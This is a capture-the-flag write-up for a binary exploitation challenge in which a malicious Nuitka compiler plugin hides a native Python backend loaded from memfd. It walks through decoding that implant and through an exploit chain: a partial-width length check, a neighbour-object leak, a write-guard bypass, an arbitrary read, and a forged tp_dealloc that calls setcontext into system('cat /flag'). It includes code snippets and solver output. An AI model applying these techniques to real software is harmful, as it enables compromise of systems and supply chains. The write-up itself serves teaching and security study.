# Pelagic Palimpsest

| Field | Value |
| --- | --- |
| CTF | z0d1akCTF 2026 Qualifiers |
| Category | Binary Exploitation |
| Author | afish |
| Points | 347 |
| Solves at time of solving | 9 |
| Flag | `zdk{ThE_deeP3sT_cUrRENt_WaS_7HE_C0MpILeR_cuRRENt}` |

> At the surface, every source is clear. In the hadal dark, the current
> remembers.

## Executive Summary

Pelagic Palimpsest is a supply-chain pwn challenge disguised as a clean Python
memo service. The handout provides audited source for `reviewd.py` and
`fastmemo_clean.py`, a compiler capsule, a clean stage-2 compiler image, a
divergence root, and a matching libc. The source backend is memory safe. The
release compiler is not honest.

The suspect Nuitka plugin recognizes the exact service AST and replaces:

```python
import fastmemo_clean as _backend
```

with:

```python
_backend = __import__("_fastmemo")
```

It also injects a compressed and XOR-encrypted ELF extension. A constructor
loads that ELF from an anonymous `memfd`, so the deployed process runs a hidden
native `_fastmemo` backend while preserving the reviewed Python source.

The native backend contains two interacting memory-corruption bugs:

1. `new()` compares only the low byte of `logical_len` against `0xd0`, so a
   length such as `0x1d0` is accepted.
2. `write()` allows an overflow when a canary-derived 12-bit expression is at
   most `0xd0`. A long `show()` leaks the next object's canary, making that
   condition deterministic.

The exploit uses three adjacent native Python objects. The first leaks the
second object's address, type, and canary. The second overflows the third. By
forging the third object's display pointer and length, `show()` becomes an
arbitrary read. That leaks the implant base and its resolved `memcpy` pointer.

Finally, the exploit forges a minimal `PyTypeObject` and a `ucontext_t` inside
the native arena. The victim's `tp_dealloc` points to libc `setcontext`, which
restores registers from the victim and enters `system("cat /flag")`. Dropping
the corresponding Python list entry triggers the forged destructor before the
service ever calls its seccomp-enabling `lockdown()` method.

```text
audited Python source
        |
        v
suspect Nuitka plugin ----> hidden _fastmemo ELF in a memfd
                                   |
                                   v
low-byte length bug -> neighbor leak -> guarded overflow
                                   |
                                   v
arbitrary read -> libc code scan -> forged PyTypeObject
                                   |
                                   v
DROP victim -> setcontext -> system("cat /flag")
```

The supplied [solver](solve.py) performs the proof gate, all leaks, runtime
code resolution, type forgery, and flag recovery in one connection.

## Repository Contents

| Path | Purpose | SHA-256 |
| --- | --- | --- |
| [`challenge/pwn_pelagic-palimpsest.tar.gz`](challenge/pwn_pelagic-palimpsest.tar.gz) | Original challenge handout | `a5a162d2402bf974163b74cb0b51e48b72af5131f88104c3e2a0bb9b65064fb6` |
| [`challenge/handout/clean-stage2.so`](challenge/handout/clean-stage2.so) | Clean stage-2 ELF used by the possession proof | `72da94c942e625a81b2d438b570894c57bd0a26477f4faa5efd659deef2338f8` |
| [`challenge/handout/libc.so.6`](challenge/handout/libc.so.6) | Supplied glibc 2.39 image | `8db37cf3f2169f59a0f07ef1fea308c35656668c64c8ff294e1860f4121eb161` |
| [`challenge/handout/offsets.json`](challenge/handout/offsets.json) | Implant and runtime offsets supplied by the challenge | `f21c616cd6ff6b56edce7f10bd2c26efbed6438872d4deb715970de289fe2139` |
| [`challenge/capsule/source/`](challenge/capsule/source/) | Audited service and clean backend source | See individual files |
| [`challenge/capsule/compiler/suspect/OptionsNannyPlugin.cpython-312-x86_64-linux-gnu.so`](challenge/capsule/compiler/suspect/OptionsNannyPlugin.cpython-312-x86_64-linux-gnu.so) | Malicious release compiler plugin | `dff8fec1ff7215e9ff2362a13443fe49f9092e7cf7dfdaff10a2eb9b0a374e37` |
| [`extract_implant.py`](extract_implant.py) | Reproducible plugin and hidden-ELF extractor | `50ce64fef588e547c3868fa4f9e6c085be2c5fdab1f4963aba73634855e7be12` |
| [`artifacts/decoded_plugin.py`](artifacts/decoded_plugin.py) | Decompressed Python source embedded in the suspect plugin | `946928e8bf2001cf3e99535f0056e81ea16d68d48a99773838f34b2b65bc00aa` |
| [`artifacts/_fastmemo.so`](artifacts/_fastmemo.so) | Recovered native implant | `02e7397f5adb61b46610077f052eea55f192ca9dc5687608599347c0722b4100` |
| [`artifacts/native-analysis.txt`](artifacts/native-analysis.txt) | Function addresses, object layout, and primitive notes | `a46507377dff2a6fd7440bcc1df528666d6cca23e2a81c1b947eb79d6643c342` |
| [`artifacts/remote-run.txt`](artifacts/remote-run.txt) | Successful exploit transcript | `b140056b6ece5d86a1c687fbb1618a2f3cded026490675d1c8064effb3ee8a72` |
| [`solve.py`](solve.py) | Dependency-free end-to-end exploit | `307bf05f361b65a9ce4432fe24ffe266607b0a7495cff19fe63f83ca14055d1c` |

## 1. Handout Triage

The outer archive contains a compact public handout and a second compiler
capsule:

```console
$ tar -tzf pwn_pelagic-palimpsest.tar.gz
pwn_pelagic-palimpsest/handout/clean-stage2.so
pwn_pelagic-palimpsest/handout/divergence.root
pwn_pelagic-palimpsest/handout/libc.so.6
pwn_pelagic-palimpsest/handout/offsets.json
pwn_pelagic-palimpsest/palimpsest-hard.tar.gz
```

The nested capsule contains:

```text
CAPSULE.md
source-lock.json
source/reviewd.py
source/fastmemo_clean.py
compiler/suspect/OptionsNannyPlugin.cpython-312-x86_64-linux-gnu.so
runtime/libc.so.6
```

`source-lock.json` identifies Python 3.12.10, Nuitka, two diverse compiler
backends, and Ubuntu 24.04. The repeated references to compiler provenance are
important: this is not merely a Python source review.

The clean backend is deliberately boring. It stores a `0xd0`-byte `bytearray`,
rejects larger logical lengths, bounds every write, and returns a copy:

```python
class FastMemo:
    def __init__(self, logical_len):
        if not 0 <= logical_len <= 0xD0:
            raise ValueError("length")
        self.logical_len = logical_len
        self.note = bytearray(0xD0)

    def write(self, offset, data):
        end = offset + len(data)
        if offset < 0 or end < offset or end > len(self.note):
            raise ValueError("bounds")
        self.note[offset:end] = data
```

`reviewd.py` exposes five operations over 32 slots:

| Opcode | Name | Request body |
| ---: | --- | --- |
| `1` | `NEW` | slot byte, then `u32le(logical_len)` |
| `2` | `WRITE` | slot byte, `u32le(offset)`, `u32le(size)`, data |
| `3` | `SHOW` | slot byte |
| `4` | `DROP` | slot byte |
| `5` | `APPLY` | slot byte, `u32le(size)`, argument |

Responses use `u8(status) || u32le(size) || body`. Only `APPLY` invokes
`_backend.lockdown()`.

## 2. Passing the Dive Proof

The service does not enter the memo protocol immediately. It first proves that
the client has the supplied clean stage-2 compiler pages and divergence root.

The server sends:

```text
"DIVE" || nonce[32] || challenge_count[1] || u16le(page_index)...
```

For an ELF, `CAPSULE.md` defines page enumeration as follows:

1. Read program headers in their original order.
2. Keep `PT_LOAD` segments without the writable flag.
3. Treat each segment separately rather than concatenating them.
4. Split its file-backed bytes into 4096-byte pages.
5. Zero-pad each final partial page.

The three relevant `clean-stage2.so` segments contribute 8, 167, and 39
pages, exactly matching `clean_page_count = 214` in `offsets.json`.

The response starts with one root proof:

```python
blake2s(b"palimpsest-dive-proof-v2\0" + nonce + divergence_root)
```

For each requested page, append:

```python
blake2s(
    b"palimpsest-page-possession-v2\0"
    + nonce
    + struct.pack("<H", page_index)
    + clean_page
)
```

`solve.py` parses the ELF directly with `struct`, constructs all 214 pages,
answers the six random page challenges, and receives:

```text
dive clearance granted
```

This gate is cryptographic possession, not the memory-corruption challenge
itself, but implementing it correctly is necessary for every exploit attempt.

## 3. Recovering the Compiler Implant

The suspect plugin is a stripped CPython extension. `strings` reveals one very
large Base85-looking constant. Inspection of the surrounding Nuitka constants
locates:

```text
Base85 payload start  0x0ba602
Base85 payload end    first NUL after the start
32-byte depth key     0x0be00c
```

The first layer is Base85, repeating-key XOR, then zlib:

```python
encoded = base64.b85decode(plugin[0xBA602:blob_end])
decoded = bytes(v ^ key[i % 32] for i, v in enumerate(encoded))
source = zlib.decompress(decoded).decode()
```

This produces 94,709 bytes of Python source. Its plugin logic fingerprints the
exact ASTs of both audited source files. When the service matches, it replaces
the clean import with `_fastmemo` and injects `_DEPTH_BRIDGE`, a large C source
constant.

The bridge contains two arrays:

```c
static const unsigned char sounding_ballast[] = { ... };
static const unsigned char sounding_salt[] = { ... };
```

Their relation is another repeating XOR:

```python
implant[i] = sounding_ballast[i] ^ sounding_salt[i % len(sounding_salt)]
```

The salt is:

```text
3c298da1963e8b1eeab75849b6b1804149bd3b670b608884fec05de3177ef305
```

The bridge creates an anonymous file with `memfd_create`, writes the decoded
14,576-byte ballast into it, and calls `dlopen(..., RTLD_NOW | RTLD_GLOBAL)`.
It also registers `_fastmemo` with `PyImport_AppendInittab`. No implant path is
needed on disk in the deployed container.

Reproduction is one command:

```console
$ python3 extract_implant.py
decoded plugin: artifacts/decoded_plugin.py (94709 bytes)
hidden implant: artifacts/_fastmemo.so (14576 bytes, 02e7397f...b4100)
```

## 4. Reversing `_fastmemo`

The extracted file is a stripped x86-64 shared object with PIE, NX, and full
RELRO. Its public strings name the five expected methods, but their behavior is
not clean.

### 4.1 Module initialization

`PyInit__fastmemo` requests `0x4100` raw bytes, aligns the result to `0x100`,
and zeros a `0x4000` arena. A 64-byte bitmap at implant offset `0x41a0` tracks
64 fixed-size objects.

The initializer also opens `/flag`. It duplicates the descriptor with
`F_DUPFD_CLOEXEC` to a randomized descriptor in the range 48 through 79 and
stores it at implant offset `0x4008`. The final exploit does not need that
descriptor because it executes before seccomp, but the offset confirms that
the backend is deliberately hostile.

### 4.2 Object layout

Each `_fastmemo.Sounding` occupies one `0x100`-byte arena slot:

| Offset | Size | Field |
| ---: | ---: | --- |
| `0x00` | 8 | Python reference count |
| `0x08` | 8 | `PyTypeObject *` |
| `0x10` | 8 | logical length |
| `0x18` | 8 | self pointer |
| `0x20` | 8 | display pointer, initially `object + 0x30` |
| `0x28` | 4 | random write guard from `getrandom()` |
| `0x2c` | 4 | padding |
| `0x30` | `0xd0` | memo bytes |

Objects are adjacent and `0x100`-aligned, which makes cross-object corruption
predictable.

### 4.3 Important offsets

The supplied `offsets.json` is consistent with the recovered binary:

```json
{
  "implant_flag_fd": 16392,
  "implant_memcpy_got": 16240,
  "implant_size": 14576,
  "implant_type": 16896,
  "memcpy_runtime": 1673920
}
```

In hexadecimal:

```text
flag descriptor   0x4008
memcpy GOT        0x3f70
Sounding type     0x4200
implant size      0x38f0
memcpy hint       0x198ac0
```

## 5. The Low-Byte Length Bug

The constructor first permits lengths up to `0x3000`. The intended `0xd0`
check then compares only `BPL`, the low byte of `RBP`:

```asm
1523: cmp    rbp, 0x3000
1530: lea    rdx, [allocation_bitmap]
1537: cmp    bpl, 0xd0
153b: jbe    allocate
```

Consequently:

```text
logical_len = 0x01d0
logical_len & 0xff = 0xd0
```

passes. `show()` trusts the stored 64-bit logical length and copies from the
display pointer with `PyBytes_FromStringAndSize`. A `0x1d0` object therefore
returns its own `0xd0` memo bytes followed by one complete neighboring object.

Allocate three objects in order:

```python
NEW(0, 0x1d0)
NEW(1, 0x1d0)
NEW(2, 0x00d0)
```

`SHOW(0)` leaks object 1 beginning at response offset `0xd0`:

```text
response+0xd0  reference count
response+0xd8  Sounding type pointer
response+0xe0  logical length
response+0xe8  object 1 self pointer
response+0xf0  object 1 display pointer
response+0xf8  object 1 write guard
```

The type pointer gives the implant base immediately:

```python
implant_base = leaked_type - 0x4200
arena_base = leaked_object1 - 0x100
object2 = leaked_object1 + 0x100
```

## 6. Defeating the Write Guard

`write()` accepts offsets and buffers through `0x3000`. It calculates:

```text
end = offset + data_length
probe = (end XOR object.guard) AND 0xfff
```

The copy is allowed if either `probe <= 0xd0` or the ordinary `end <= 0xd0`
condition holds. In equivalent pseudocode:

```python
if ((end ^ guard) & 0xfff) <= 0xd0 or end <= 0xd0:
    memcpy(object + 0x30 + offset, data, len(data))
else:
    raise ValueError("bounds")
```

Because `SHOW(0)` leaked object 1's guard, the exploit can choose a valid end
deterministically. It writes at memo offset `0xd0`:

```text
object1 + 0x30 + 0xd0 = object1 + 0x100 = object2
```

and pads the desired payload until the predicate passes:

```python
for end in range(minimum_end, 0x30d1):
    if ((end ^ guard) & 0xfff) <= 0xd0:
        payload = desired.ljust(end - 0xd0, b"\0")
        WRITE(1, 0xd0, payload)
        break
```

The random guard has become a padding oracle entirely under attacker control.

## 7. Building an Arbitrary Read

The native `show()` implementation validates only that its object argument is
an allocated, aligned arena slot. It then uses two mutable fields:

```c
return PyBytes_FromStringAndSize(object->display_pointer,
                                 object->logical_length);
```

Overflow object 1 into object 2 and forge this header:

```python
forged = (
    p64(1)                  # valid reference count
    + p64(sounding_type)    # preserve the real type for now
    + p64(read_size)
    + p64(object2)
    + p64(target_address)
    + p32(0)
    + p32(0)
)
```

`SHOW(2)` now returns bytes from any mapped address. The first target is the
implant's `memcpy` GOT entry:

```python
memcpy = u64(arbitrary_read(implant_base + 0x3f70, 8))
```

Full RELRO prevents overwriting this GOT entry, but reading it gives a libc
code pointer.

## 8. Resolving the Live Libc Safely

The handout suggests subtracting `memcpy_runtime = 0x198ac0`. On the live CPU,
`memcpy` is an IFUNC and resolves to a different optimized implementation.
Subtracting the hint produces a nearby anchor, not a valid conventional load
bias. Blindly adding `setcontext` and `system` offsets to that anchor lands in
the wrong instructions.

The exploit avoids relying on the IFUNC choice. It takes the first 32 bytes of
the supplied libc functions at:

```text
setcontext  file offset 0x4a960
system      file offset 0x58750
```

and uses the arbitrary read to scan the early executable libc mapping in
`0x3000`-byte windows. Both signatures are unique. In the successful run:

```text
memcpy leak  = 0x7fe461e5a4c0
libc anchor  = 0x7fe461cc1a00
setcontext   = 0x7fe461d03960
system       = 0x7fe461d11750
```

This signature-based resolution is robust against the runtime-selected
`memcpy` implementation and directly validates that the destinations contain
the expected supplied-libc code.

## 9. Forging a Python Type

The service keeps the native objects in an ordinary Python list. `DROP` runs:

```python
slots[slot] = None
```

Replacing the last reference decrements the object to zero. CPython then calls:

```c
Py_TYPE(object)->tp_dealloc(object);
```

`tp_dealloc` is at offset `0x30` in `PyTypeObject`. The final overflow turns
object 2 into a `ucontext_t` and points its type at a fake type farther into
the same writable arena:

```text
object2+0x000  refcount = 1
object2+0x008  fake type = object2+0x300
object2+0x068  restored RDI = object2+0x200
object2+0x0a0  restored RSP = arena+0x3008
object2+0x0a8  restored RIP = system
object2+0x0e0  fpregs pointer = object2+0x180
object2+0x200  "cat /flag\0"
object2+0x330  fake_type.tp_dealloc = setcontext
```

The stack pointer ends in 8 modulo 16, as required when entering `system`
through a return rather than a normal `call` instruction.

The supplied glibc `setcontext` entry is especially convenient. It begins
with `ENDBR64`, preserving compatibility with indirect branch tracking, then
pushes its `RDI` argument. After `rt_sigprocmask`, it pops that original object
pointer into `RDX` and restores the context from it. No separate register
gadget is required.

The fake `fpregs` area and MXCSR field are zero-filled but valid. `setcontext`
restores `RDI` to the command string, switches to the aligned arena stack, and
returns into `system`.

Finally:

```python
DROP(2)
```

causes:

```text
Py_DECREF(object2)
  -> fake_type.tp_dealloc(object2)
  -> setcontext(object2)
  -> system("cat /flag")
```

The shell inherits the service's standard output, so the flag appears on the
TLS connection. The process crashes only after `system` returns because the
forged stack has no continuation address; the flag has already been flushed.

## 10. Why Seccomp Does Not Interfere

The implant's `lockdown()` uses `prctl` to install a seccomp filter, but the
service invokes it only inside the `APPLY` opcode:

```python
_backend.lockdown()
result = _backend.apply(slots[slot], argument)
```

The exploit uses only `NEW`, `SHOW`, `WRITE`, and `DROP`. It never sends
`APPLY`, so `system` executes before any filter is installed. This is simpler
than building a flag-descriptor ROP chain under the filter.

## 11. End-to-End Reproduction

The solver uses only the Python standard library. First confirm that the
implant extraction is reproducible:

```console
$ cd Pwn/pelagic-palimpsest
$ python3 extract_implant.py
decoded plugin: artifacts/decoded_plugin.py (94709 bytes)
hidden implant: artifacts/_fastmemo.so (14576 bytes, 02e7397f...b4100)
```

Start a fresh challenge instance and pass its hostname to the solver:

```console
$ python3 solve.py HOSTNAME.chals.z0d1ak.org 1337
[+] proof accepted (indexes=[102, 193, 167, 92, 184, 74])
[+] arena       = 0x555572b00300
[+] implant     = 0x7fe461cb2000
[+] write guard = 0x27322746
[+] memcpy      = 0x7fe461e5a4c0
[+] libc anchor = 0x7fe461cc1a00
[+] setcontext  = 0x7fe461d03960
[+] system      = 0x7fe461d11750
[+] forged destructor; dropping victim
zdk{ThE_deeP3sT_cUrRENt_WaS_7HE_C0MpILeR_cuRRENt}
```

The historical hostname is retained as the script default, and `HOST` and
`PORT` environment variables are also supported. Since private instances are
ephemeral, passing the current hostname explicitly is recommended.

## 12. Key Takeaways

1. Audited source is not sufficient when the release compiler can transform
   imports or inject native constructors.
2. A partial-width comparison can invalidate an otherwise correct upper bound.
3. Random canaries do not help when an adjacent-object disclosure reveals the
   value used by the check.
4. Mutable pointer and length fields turn a linear overflow into a clean
   arbitrary-read primitive.
5. IFUNC-resolved pointers are poor fixed-offset anchors; matching verified
   code bytes is safer when an arbitrary read is available.
6. Native Python extension corruption can be converted into control flow by
   forging `PyTypeObject.tp_dealloc` and releasing the object normally.

## Flag

```text
zdk{ThE_deeP3sT_cUrRENt_WaS_7HE_C0MpILeR_cuRRENt}
```
